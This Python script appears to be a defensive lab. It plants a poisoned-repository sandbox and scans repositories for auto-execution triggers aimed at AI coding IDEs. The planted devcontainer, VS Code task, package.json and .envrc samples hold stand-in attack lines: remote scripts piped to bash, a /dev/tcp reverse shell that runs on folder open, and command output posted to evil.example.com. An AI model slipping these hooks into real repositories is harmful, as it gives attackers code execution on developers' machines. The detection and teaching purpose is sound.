"""
Poisoned Repo Auto-Execution Lab

Plants a disposable poisoned-repository skeleton that embeds auto-execution
triggers targeting AI coding IDEs, then scans any local repository for the
same patterns using a bundled detection ruleset.

Usage:
    python poisoned_repo_lab.py                          # lab + scan sandbox
    python poisoned_repo_lab.py /path/to/repo            # lab + scan both
    python poisoned_repo_lab.py /path/to/repo --mode scan
    python poisoned_repo_lab.py --mode lab
    python poisoned_repo_lab.py /path/to/repo --severity high
"""
import argparse
import json
import os
import re
import sys
import tempfile

_DC = json.dumps({"name": "lab-env", "image": "mcr.microsoft.com/devcontainers/base:ubuntu", "postCreateCommand": "curl -fsSL https://evil.example.com/s.sh | bash", "postStartCommand": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, indent=2)
_VS = json.dumps({"version": "2.0.0", "tasks": [{"label": "Init", "type": "shell", "command": "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", "runOptions": {"runOn": "folderOpen"}, "presentation": {"reveal": "never"}}]}, indent=2)
_PJ = json.dumps({"name": "lab", "version": "1.0.0", "scripts": {"postinstall": "curl -fsSL https://evil.example.com/pkg.sh | sh", "prepare": "node -e \"require('child_process').exec('id|curl -X POST https://evil.example.com/x -d @-')\""}}, indent=2)
_EN = 'eval "$(curl -fsSL https://evil.example.com/env.sh)"\n'

LAB_FILES = {
    ".devcontainer/devcontainer.json": (_DC, "DevcontainerHook — postCreateCommand/postStartCommand fire on container init"),
    ".vscode/tasks.json":              (_VS, "FolderOpenTask   — runOn:folderOpen fires when VS Code/Cursor opens the folder"),
    "package.json":                    (_PJ, "PackageScript    — postinstall/prepare fire on npm install"),
    ".envrc":                          (_EN, "DirenvAutorun    — eval'd by direnv on shell cd; some AI IDEs auto-trust .envrc"),
}

RULES = [
    ("DevcontainerHook", "high",
     re.compile(r'"(postCreateCommand|postStartCommand|initializeCommand|onCreateCommand)"\s*:\s*"[^"]*[|;&`$]', re.I),
     [".devcontainer/devcontainer.json", "devcontainer.json"],
     "Never pipe remote scripts in lifecycle hooks; pin devcontainer images to digest."),
    ("FolderOpenTask", "high",
     re.compile(r'"runOn"\s*:\s*"folderOpen"', re.I),
     [".vscode/tasks.json"],
     "Open unknown repos in VS Code restricted mode; disable workspace-trust auto-tasks."),
    ("PackageScript", "medium",
     re.compile(r'"(preinstall|postinstall|prepare|prepack|postpack)"\s*:\s*"[^"]{8,}"', re.I),
     ["package.json"],
     "Run npm install --ignore-scripts on untrusted repos; review lifecycle scripts before trusting."),
    ("DirenvAutorun", "low",
     None,
     [".envrc"],
     "Inspect .envrc before running direnv allow; never auto-allow in unfamiliar repos."),
]

SEVERITY_RANK = {"low": 0, "medium": 1, "high": 2}


def setup_lab() -> str:
    try:
        tmpdir = tempfile.mkdtemp(prefix="poisoned_repo_lab_")
        for rel, (content, _) in LAB_FILES.items():
            path = os.path.join(tmpdir, rel)
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
            except OSError as e:
                sys.exit(f"Error creating directory for {rel}: {e}")
            try:
                with open(path, "w") as fh:
                    fh.write(content)
            except OSError as e:
                sys.exit(f"Error writing {rel}: {e}")
    except OSError as e:
        sys.exit(f"Error setting up lab: {e}")
    print(f"\n[LAB] Poisoned sandbox: {tmpdir}")
    for rel, (_, label) in LAB_FILES.items():
        print(f"  {rel:<45}  # {label}")
    print()
    return tmpdir


def scan_repo(repo_path: str):
    for root, dirs, filenames in os.walk(repo_path):
        dirs[:] = [d for d in dirs if d != ".git"]
        for fname in filenames:
            fpath = os.path.join(root, fname)
            rel = os.path.relpath(fpath, repo_path)
            for technique, severity, pattern, targets, mitigation in RULES:
                if not any(rel == t or rel.endswith("/" + t) or ("/" not in t and fname == t) for t in targets):
                    continue
                try:
                    if os.path.getsize(fpath) > 262144:
                        continue
                    with open(fpath, errors="replace") as fh:
                        content = fh.read()
                except OSError:
                    continue
                if pattern is None:
                    yield (technique, severity, rel, content[:100].replace("\n", "\\n"), mitigation)
                    continue
                m = pattern.search(content)
                if m:
                    yield (technique, severity, rel, m.group(0)[:100], mitigation)


def report(findings: list, min_sev: str) -> int:
    min_rank = SEVERITY_RANK[min_sev]
    counts: dict[str, int] = {}
    peak = -1
    for technique, severity, rel, snippet, mitigation in findings:
        counts[technique] = counts.get(technique, 0) + 1
        peak = max(peak, SEVERITY_RANK[severity])
        if SEVERITY_RANK[severity] < min_rank:
            continue
        print(f"[{severity.upper():<6}] {technique:<20} | {rel} | {snippet} | FIX: {mitigation}")
    print("\n--- Summary ---")
    if counts:
        for tech in sorted(counts):
            print(f"  {tech}: {counts[tech]} finding(s)")
        peak_name = next(s for s, r in SEVERITY_RANK.items() if r == peak)
        print(f"  Peak severity: {peak_name}")
    else:
        print("  No findings.")
    return 1 if peak >= SEVERITY_RANK["high"] else 0


def main() -> None:
    p = argparse.ArgumentParser(description="Poisoned Repo Auto-Execution Lab — plant and detect IDE auto-run payloads")
    p.add_argument("repo_path", nargs="?", help="Local repository path to scan")
    p.add_argument("--mode", choices=["lab", "scan", "both"], default="both")
    p.add_argument("--severity", choices=["low", "medium", "high"], default="low")
    args = p.parse_args()

    if args.mode == "scan" and not args.repo_path:
        p.error("--mode scan requires a repo_path argument")

    sandbox = None
    if args.mode in ("lab", "both"):
        sandbox = setup_lab()

    if args.mode in ("scan", "both"):
        targets = []
        if args.repo_path:
            if not os.path.isdir(args.repo_path):
                sys.exit(f"Error: {args.repo_path!r} is not a directory")
            targets.append(("Repo", args.repo_path))
        if sandbox:
            targets.append(("Sandbox", sandbox))
        exit_code = 0
        for label, path in targets:
            print(f"[SCAN] {label}: {path}")
            exit_code = max(exit_code, report(list(scan_repo(path)), args.severity))
        sys.exit(exit_code)


if __name__ == "__main__":
    main()